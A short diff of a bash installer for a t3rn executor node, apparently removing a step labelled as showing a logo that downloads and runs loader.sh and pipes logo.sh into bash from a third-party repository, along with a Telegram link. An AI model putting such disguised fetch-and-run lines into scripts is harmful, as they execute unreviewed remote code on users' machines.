@@ -1,12 +1,5 @@
 #!/bin/bash
 
-echo "Showing CryPtoDrops logo..."
-wget -O loader.sh https://raw.githubusercontent.com/FEdanish/fenode-guide/main/loader.sh && chmod +x loader.sh && ./loader.sh
-curl -s https://raw.githubusercontent.com/FEdanish/fenode-guide/main/logo.sh | bash
-sleep 2
-
-
-
 echo "Welcome to the t3rn Paras the baau!"
 
 cd $HOME
@@ -67,4 +60,4 @@ echo "Starting the Executor..."
 ./executor
 
 echo "Setup complete! The Executor is now running."
-echo "Subscribe: https://t.me/feature_earning"
+
